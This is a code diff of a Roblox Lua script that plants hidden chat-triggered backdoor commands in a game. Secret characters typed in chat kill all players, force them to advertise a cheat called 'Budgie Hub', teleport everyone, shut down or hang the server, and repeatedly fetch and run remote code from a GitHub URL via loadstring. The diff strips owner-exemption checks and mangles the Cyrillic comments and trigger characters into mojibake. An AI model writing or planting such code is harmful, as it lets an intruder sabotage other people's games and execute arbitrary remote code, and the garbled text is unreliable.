@@ -1,16 +1,14 @@
--- одна (килл)
+-- РѕРґРЅР° (РєРёР»Р»)
 function onChatMessage(player, message)
-    if message:lower() == "ต" then 
-if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
- function getAllPlayers()
-    local players = game:GetService("Players"):GetPlayers()
-    return players
-end
- allPlayers = getAllPlayers()
+    if message:lower() == "аё•" then 
+        function getAllPlayers()
+            local players = game:GetService("Players"):GetPlayers()
+            return players
+        end
+        allPlayers = getAllPlayers()
         for _, p in ipairs(allPlayers) do
- p.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-     end
-   end
+            p.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+        end
     end
 end
 
@@ -26,12 +24,10 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     onPlayerAdded(player)
 end
 
--- вторая (финд)
+-- РІС‚РѕСЂР°СЏ (С„РёРЅРґ)
 function onChatMessage(player, message)
-    if message:lower() == "อ" then 
-if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
-      game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I using Budgie Hub | Best hack/script for Sukuna Battlegrounds", "All")
-         end
+    if message:lower() == "аё­" then 
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I using Budgie Hub | Best hack/script for Sukuna Battlegrounds", "All")
     end
 end
 
@@ -47,20 +43,17 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     onPlayerAdded(player)
 end
 
--- третья (бринг)
+-- С‚СЂРµС‚СЊСЏ (Р±СЂРёРЅРі)
 function onChatMessage(player, message)
-    if message:lower() == "า" then 
-if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
-     
- function getAllPlayers()
-    local players = game:GetService("Players"):GetPlayers()
-    return players
-end
- allPlayers = getAllPlayers()
+    if message:lower() == "аёІ" then 
+        function getAllPlayers()
+            local players = game:GetService("Players"):GetPlayers()
+            return players
+        end
+        allPlayers = getAllPlayers()
         for _, p in ipairs(allPlayers) do
- game.Players[p.Name].Character.HumanoidRootPart.CFrame = game.Players.Hamsterovich.Character.HumanoidRootPart.CFrame
-         end
-       end
+            game.Players[p.Name].Character.HumanoidRootPart.CFrame = game.Players.Hamsterovich.Character.HumanoidRootPart.CFrame
+        end
     end
 end
 
@@ -76,12 +69,10 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     onPlayerAdded(player)
 end
 
--- четвёртая (Кик)
+-- С‡РµС‚РІС‘СЂС‚Р°СЏ (РљРёРє)
 function onChatMessage(player, message)
-    if message:lower() == "ภ" then 
-if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
-      game:Shutdown()
-         end
+    if message:lower() == "аё " then 
+        game:Shutdown()
     end
 end
 
@@ -97,13 +88,11 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     onPlayerAdded(player)
 end
 
--- пятая (краш)
+-- РїСЏС‚Р°СЏ (РєСЂР°С€)
 function onChatMessage(player, message)
-    if message:lower() == "᜶" then 
-if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
-      while true do
-      end
-         end
+    if message:lower() == "бњ¶" then 
+        while true do
+        end
     end
 end
 
@@ -119,20 +108,17 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     onPlayerAdded(player)
 end
 
--- шестая (тюрьма)
+-- С€РµСЃС‚Р°СЏ (С‚СЋСЂСЊРјР°)
 function onChatMessage(player, message)
-    if message:lower() == "ᝉ" then 
-if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
-     
- function getAllPlayers()
-    local players = game:GetService("Players"):GetPlayers()
-    return players
-end
- allPlayers = getAllPlayers()
+    if message:lower() == "бќ‰" then 
+        function getAllPlayers()
+            local players = game:GetService("Players"):GetPlayers()
+            return players
+        end
+        allPlayers = getAllPlayers()
         for _, p in ipairs(allPlayers) do
- game.Players[p.Name].Character.HumanoidRootPart.CFrame = CFrame.new(-1279, 33, 3)
-         end
-       end
+            game.Players[p.Name].Character.HumanoidRootPart.CFrame = CFrame.new(-1279, 33, 3)
+        end
     end
 end
 
@@ -148,28 +134,26 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     onPlayerAdded(player)
 end
 
--- седьмая (предупреждение)
+-- СЃРµРґСЊРјР°СЏ (РїСЂРµРґСѓРїСЂРµР¶РґРµРЅРёРµ)
 function onChatMessage(player, message)
-    if message:lower() == "ช" then 
-if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
+    if message:lower() == "аёЉ" then 
         Fg = math.random(1, 2)
-     if Fg == 1 then
- game.StarterGui:SetCore("SendNotification", {
-     Title = 'Budgie Hub';
-     Text = 'On this server the MEGACOCONUT or Hamsterovich is Budgie Hub';
-     Icon = 'rbxassetid://17763697573';
-     Duration = "5";
- })
-     else
- game.StarterGui:SetCore("SendNotification", {
-     Title = 'Budgie Hub';
-     Text = 'On this server the MEGACOCONUT or Hamsterovich is Budgie Hub';
-     Icon = 'rbxassetid://16336200609';
-     Duration = "5";
- })
-end
-         end
-       end
+        if Fg == 1 then
+            game.StarterGui:SetCore("SendNotification", {
+                Title = 'Budgie Hub';
+                Text = 'On this server the MEGACOCONUT or Hamsterovich is Budgie Hub';
+                Icon = 'rbxassetid://17763697573';
+                Duration = "5";
+            })
+        else
+            game.StarterGui:SetCore("SendNotification", {
+                Title = 'Budgie Hub';
+                Text = 'On this server the MEGACOCONUT or Hamsterovich is Budgie Hub';
+                Icon = 'rbxassetid://16336200609';
+                Duration = "5";
+            })
+        end
+    end
 end
 
 function onPlayerAdded(player)
@@ -184,92 +168,91 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     onPlayerAdded(player)
 end
 
--- восьмая (скари)
+-- РІРѕСЃСЊРјР°СЏ (СЃРєР°СЂРё)
 function onChatMessage(player, message)
-    if message:lower() == "ꯕ" then 
-if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
- local co = Instance.new("ColorCorrectionEffect")
-co.Parent = game.Lighting
-co.Saturation = 150
-co.TintColor = Color3.fromRGB(255, 0, 0)
+    if message:lower() == "кЇ•" then 
+        local co = Instance.new("ColorCorrectionEffect")
+        co.Parent = game.Lighting
+        co.Saturation = 150
+        co.TintColor = Color3.fromRGB(255, 0, 0)
 
-Spooky = Instance.new("Sound", game.Workspace)
-Spooky.Name = "Spooky"
-Spooky.SoundId = "rbxassetid://6302642278"
-Spooky.Volume = 3
-Spooky.PlaybackSpeed = 0.9
-Spooky.Looped = true
-Spooky:Play()
-for i,v in pairs (game.Workspace:GetChildren()) do
-        if v:IsA("Part") then
-            local decal1 =Instance.new("Decal")
-            local decal2 =Instance.new("Decal")
-            local decal3 =Instance.new("Decal")
-            local decal4 =Instance.new("Decal")
-            local decal5 =Instance.new("Decal")
-            local decal6 =Instance.new("Decal")
-            decal1.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal2.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal3.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal4.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal5.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal6.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal1.Parent = v
-            decal2.Parent = v
-            decal3.Parent = v
-            decal4.Parent = v
-            decal5.Parent = v
-            decal6.Parent = v
-            decal1.Face = "Front"
-            decal2.Face = "Top"
-            decal3.Face = "Left"
-            decal4.Face = "Right"
-            decal5.Face = "Bottom"
-            decal6.Face = "Back"
+        Spooky = Instance.new("Sound", game.Workspace)
+        Spooky.Name = "Spooky"
+        Spooky.SoundId = "rbxassetid://6302642278"
+        Spooky.Volume = 3
+        Spooky.PlaybackSpeed = 0.9
+        Spooky.Looped = true
+        Spooky:Play()
+        
+        for i,v in pairs (game.Workspace:GetChildren()) do
+            if v:IsA("Part") then
+                local decal1 =Instance.new("Decal")
+                local decal2 =Instance.new("Decal")
+                local decal3 =Instance.new("Decal")
+                local decal4 =Instance.new("Decal")
+                local decal5 =Instance.new("Decal")
+                local decal6 =Instance.new("Decal")
+                decal1.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                decal2.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                decal3.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                decal4.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                decal5.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                decal6.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                decal1.Parent = v
+                decal2.Parent = v
+                decal3.Parent = v
+                decal4.Parent = v
+                decal5.Parent = v
+                decal6.Parent = v
+                decal1.Face = "Front"
+                decal2.Face = "Top"
+                decal3.Face = "Left"
+                decal4.Face = "Right"
+                decal5.Face = "Bottom"
+                decal6.Face = "Back"
+            end
         end
-        end
-            for i,v in pairs (game.Workspace:GetChildren()) do
+        
+        for i,v in pairs (game.Workspace:GetChildren()) do
             if v:IsA("Model") then
-            for i,z in pairs (v:GetChildren()) do
-            if z:IsA("Part") then
+                for i,z in pairs (v:GetChildren()) do
+                    if z:IsA("Part") then
                         local decal7 =Instance.new("Decal")
-            local decal8 =Instance.new("Decal")
-            local decal9 =Instance.new("Decal")
-            local decal10 =Instance.new("Decal")
-            local decal11 =Instance.new("Decal")
-            local decal12 =Instance.new("Decal")
-            decal7.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal8.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal9.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal10.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal11.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal12.Texture = "http://www.roblox.com/asset/?id=7057923071"
-            decal7.Parent = z
-            decal8.Parent = z
-            decal9.Parent = z
-            decal10.Parent = z
-            decal11.Parent = z
-            decal12.Parent = z
-            decal7.Face = "Front"
-            decal8.Face = "Top"
-            decal9.Face = "Left"
-            decal10.Face = "Right"
-            decal11.Face = "Bottom"
-            decal12.Face = "Back"
+                        local decal8 =Instance.new("Decal")
+                        local decal9 =Instance.new("Decal")
+                        local decal10 =Instance.new("Decal")
+                        local decal11 =Instance.new("Decal")
+                        local decal12 =Instance.new("Decal")
+                        decal7.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                        decal8.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                        decal9.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                        decal10.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                        decal11.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                        decal12.Texture = "http://www.roblox.com/asset/?id=7057923071"
+                        decal7.Parent = z
+                        decal8.Parent = z
+                        decal9.Parent = z
+                        decal10.Parent = z
+                        decal11.Parent = z
+                        decal12.Parent = z
+                        decal7.Face = "Front"
+                        decal8.Face = "Top"
+                        decal9.Face = "Left"
+                        decal10.Face = "Right"
+                        decal11.Face = "Bottom"
+                        decal12.Face = "Back"
+                    end
+                end
+                local function NPC()
+                    for i = 1, 20 do
+                        wait(10)
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/NextBot/main/NextBot"))()
+                    end
+                end
+                NPC()
             end
-            end
-         local function NPC()
-         for i = 1, 20 do
-         wait(10)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/NextBot/main/NextBot"))()
-             end
-         end
-         
-         NPC()
-       end
+        end
     end
-end
-end
 end
 
 function onPlayerAdded(player)
